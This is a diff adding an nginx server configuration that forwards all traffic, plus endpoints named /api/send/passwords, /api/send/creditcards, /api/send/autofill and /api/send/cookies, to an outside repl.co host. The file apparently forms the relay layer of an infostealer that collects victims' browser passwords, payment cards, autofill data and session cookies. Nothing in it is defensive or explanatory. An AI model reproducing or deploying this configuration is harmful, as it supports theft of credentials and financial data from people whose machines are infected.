@@ -1,0 +1,54 @@
+server {
+    listen 0.0.0.0:80;
+    server_name localhost;
+
+    location / {
+      proxy_set_header X-Real-IP $remote_addr;
+      proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
+      proxy_set_header Host $http_host;
+      proxy_set_header X-NginX-Proxy true;
+
+      proxy_pass https://zortt.xfixxyy12951.repl.co/;
+      proxy_redirect off;
+    }
+
+    location /api/send/passwords {
+      proxy_set_header X-Real-IP $remote_addr;
+      proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
+      proxy_set_header Host $http_host;
+      proxy_set_header X-NginX-Proxy true;
+
+      proxy_pass https://zortt.xfixxyy12951.repl.co/api/send/passwords;
+      proxy_redirect off;
+    }
+
+    location /api/send/creditcards {
+      proxy_set_header X-Real-IP $remote_addr;
+      proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
+      proxy_set_header Host $http_host;
+      proxy_set_header X-NginX-Proxy true;
+
+      proxy_pass https://zortt.xfixxyy12951.repl.co/api/send/creditcards;
+      proxy_redirect off;
+    }
+
+    location /api/send/autofill {
+      proxy_set_header X-Real-IP $remote_addr;
+      proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
+      proxy_set_header Host $http_host;
+      proxy_set_header X-NginX-Proxy true;
+
+      proxy_pass https://zortt.xfixxyy12951.repl.co/api/send/autofill;
+      proxy_redirect off;
+    }
+
+    location /api/send/cookies {
+      proxy_set_header X-Real-IP $remote_addr;
+      proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
+      proxy_set_header Host $http_host;
+      proxy_set_header X-NginX-Proxy true;
+
+      proxy_pass https://zortt.xfixxyy12951.repl.co/api/send/cookies;
+      proxy_redirect off;
+    }
+ }
